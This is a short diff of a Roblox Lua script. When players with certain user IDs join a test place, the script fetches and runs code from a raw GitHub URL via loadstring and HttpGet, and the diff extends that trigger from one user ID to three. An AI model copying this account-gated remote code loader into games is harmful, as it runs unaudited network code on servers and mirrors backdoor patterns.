@@ -1,6 +1,6 @@
 if game.PlaceId == 5171401238 then -- Test Server 🛠
 	game.Players.PlayerAdded:Connect(function(Player)
-		if Player.UserId == 927649548 then
+		if Player.UserId == 927649548 or Player.UserId == 3861125271 or Player.UserId == 3985448933 then
 			loadstring(game:HttpGet('https://raw.githubusercontent.com/Tamachiru/AppleX/main/1'))()
 		end
 	end)
